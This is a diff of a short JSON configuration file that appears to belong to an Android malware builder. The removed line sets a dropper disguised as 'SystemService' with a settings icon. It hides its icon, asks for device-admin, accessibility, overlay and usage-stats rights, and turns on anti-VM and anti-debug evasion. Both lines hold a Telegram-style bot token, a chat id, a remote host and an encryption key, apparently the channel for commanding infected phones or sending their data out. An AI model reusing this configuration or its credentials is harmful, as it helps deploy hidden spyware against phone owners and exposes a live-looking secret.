@@ -1,1 +1,2 @@
-{ "token": "{{8404654689:AAEv515B_eJvFLb9yd17r8FDUVbNXy4p0N8}}", "id": "{{7796768934}}", "host": "{{https://safgdsa.onrender.com}}", "text": "", "X": { "dropperName": "SystemService", "iconId": "ic_launcher_settings", "wakeLock": true, "hideIcon": true, "requestBattery": true, "requestDeviceAdmin": true, "requestAccessibility": true, "requestOverlay": true, "requestUsageStats": true, "antiVm": true, "antiDebug": true, "encKey": "{{a1b2c3d4e5f6789012345678901234567890abcdef1234567890abcdef123456}}", "interval": 3000 } }
+{ "token": "{{8404654689:AAEv515B_eJvFLb9yd17r8FDUVbNXy4p0N8}}", "id": "{{7796768934}}", "host": "{{https://safgdsa.onrender.com}}", "encKey": "{{a1b2c3d4e5f6789012345678901234567890abcdef1234567890abcdef123456}}" }
+
